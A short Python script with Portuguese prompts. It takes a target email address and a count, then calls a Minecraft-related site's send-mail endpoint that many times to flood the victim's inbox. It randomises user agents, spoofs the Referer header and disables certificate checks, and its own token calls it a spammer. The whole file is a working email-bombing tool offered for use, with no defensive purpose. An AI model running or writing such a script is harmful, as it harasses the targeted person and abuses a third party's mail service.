import requests
import urllib3
from fake_useragent import UserAgent

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://minecraft-solutions.com/login/send-mail/index.php?email={email}&user=github.com/ImNotGlitch&token=spammer_by_imnotglitch"

email = input("Digite o email: ")
times = int(input("Vezes: "))
formatted_url = url.format(email=email)

user_agent = UserAgent()
headers = {
    "Host": "minecraft-solutions.com",
    "User-Agent": user_agent.random,
    "Referer": "https://minecraft-solutions.com/login/register.php?alert=3"
}

for _ in range(times):
    response = requests.get(formatted_url, headers=headers, verify=False)

    if response.status_code == 200:
        print("Enviado com sucesso!")
    else:
        print("Bad Requests")

print("Todos os emails foram enviados!")